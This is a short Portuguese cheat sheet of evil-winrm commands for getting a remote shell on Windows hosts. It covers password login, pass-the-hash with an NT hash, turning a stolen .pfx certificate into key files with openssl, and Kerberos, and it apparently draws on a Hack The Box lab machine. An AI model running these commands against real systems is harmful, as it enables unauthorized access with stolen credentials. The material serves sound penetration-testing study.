Winrm
========================


## Basico

Comandos mais básicos da ferramenta:

```
evil-winrm -i 10.10.10.10 -u username -p password
```


## Pass the hash

```
evil-winrm -i 10.10.10.10 -u username -H :<nt_hash>
```
## Certificate authentication

 Uma vez obtido um certificado (.pfx), é necessário gerar duas informações, uma chave privada e uma pública com os comandos abaixo:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

Dessa forma a gente conseguia acesso na máquina via evil-winrm

```
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S -r timelapse.htb
```

ref: <https://wadcoms.github.io/wadcoms/Evil-Winrm-PKINIT/>


## Kerberos authentication

```
evil-winrm -i dc01.home.lab -r home.lab
```